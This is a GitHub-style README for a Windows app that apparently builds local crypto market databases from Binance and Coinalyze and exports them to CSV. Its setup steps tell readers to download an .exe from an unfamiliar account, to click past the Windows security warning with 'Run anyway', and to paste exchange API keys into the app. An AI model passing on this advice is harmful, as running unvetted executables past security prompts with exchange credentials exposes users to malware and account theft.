# 📊 crypto-data-manager - Build local historical crypto market databases

[![Download Windows App](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Herbaceous-flatfish820/crypto-data-manager/releases)

This application helps users fetch historical price and volume data from Binance and Coinalyze. You store this information in a local database file. You can then export your data to CSV files. The tool manages updates automatically so your database stays current.

## 📥 Getting the software

Visit this page to download the latest version for Windows: https://github.com/Herbaceous-flatfish820/crypto-data-manager/releases

Look for the file that ends with `.exe` in the latest release section. Download this file to your computer.

## 💻 System requirements

*   Operating System: Windows 10 or Windows 11.
*   Disk Space: At least 500 MB for the database files.
*   Internet Connection: Required to download data from exchange servers.
*   Memory: 4 GB of RAM (minimum).

## 🚀 Setting up the application

1. Find the `.exe` file you downloaded. Usually, it sits in your Downloads folder.
2. Double-click the file. 
3. If Windows shows a security window, click "More info" and then click "Run anyway." This happens because the app comes from outside the Microsoft Store.
4. The main screen shows a simple menu. You do not need to install anything else. The program runs as a portable tool.

## 📖 Using the application

The interface consists of three main parts. Follow these steps to build your data warehouse.

### Connecting to sources
You must select which exchange you want to use. The app supports Binance and Coinalyze. Select the exchange from the dropdown menu at the top. Some exchanges require an API key. You can find your API key by logging into your account on the exchange website. Paste this key into the settings tab of this tool.

### Choosing your coins
Select the trading pairs you want to track. You can search for pairs like BTC/USDT or ETH/USDT. Check the boxes next to the pairs you want to add to your database.

### Setting your timeframe
Choose how far back you want to collect data. Enter a start date and an end date. Choose the interval (e.g., 1 minute, 5 minutes, 1 hour). The app fetches the data based on these settings.

## 🔄 Updating your database

The app keeps track of the data it already collected. When you click the update button, the app checks the last entry in your database. It fetches only the new data points since that time. This saves bandwidth and time. You do not need to download the full history again.

## 📂 Exporting data to CSV

Once you have data in your database, you can move it to a spreadsheet. 

1. Click the Export button.
2. Choose the specific metrics you want. You can pick time, open, high, low, close, and volume.
3. Select your file location.
4. Click Save. 

You can now open this file in Excel or Google Sheets.

## ⚙️ Understanding settings

The Settings tab lets you control how the app operates.

*   File path: Change where the app saves your database file.
*   API keys: Update or remove your exchange keys.
*   Auto-update: Turn this feature on if you want the app to check for new data every time it starts.

## ❓ Frequently asked questions

### Does the app work without internet?
You can view data already stored in your database offline. However, you need an internet connection to fetch new data from the exchanges.

### Where does the data go?
All data goes into a file named data.db inside the folder where you keep the application. You can move this file to a safe location or back it up to a cloud drive.

### Can I track many coins at once?
Yes. Select multiple pairs in the main interface. The app processes these in order.

### Is the data accurate? 
The app pulls data directly from the exchange servers. It ensures the integrity of the data by checking for gaps between requests.

### How do I remove the app?
Since this is a portable application, simply delete the `.exe` file and the `data.db` folder. The app leaves no traces in your system registry or other folders.

## 🛠️ Troubleshooting

If the app fails to fetch data, follow these steps:
1. Check your internet connection.
2. Verify that your API keys are correct.
3. Ensure the exchange supports the trading pair you selected.
4. Check that you have enough space on your hard drive. 
5. Restart the application.

If the app shows an error message, copy the message text and check for it in your logs folder. You can also clear the app cache within the settings menu to reset the connection state. 

## 🛡️ Privacy and security

The application stores your data only on your hardware. It does not send your price data to any third party. Your API keys remain on your computer. Do not share your database file with others, as it may contain your configuration details. Always store your database in a secure folder.

## 📝 Performance tips

*   If you choose a high frequency (like 1-minute intervals) for many years, the database size may grow quickly.
*   Export your data regularly to keep the database size small if you have limited drive space.
*   Close other high-bandwidth applications while downloading years of historical data to speed up the process.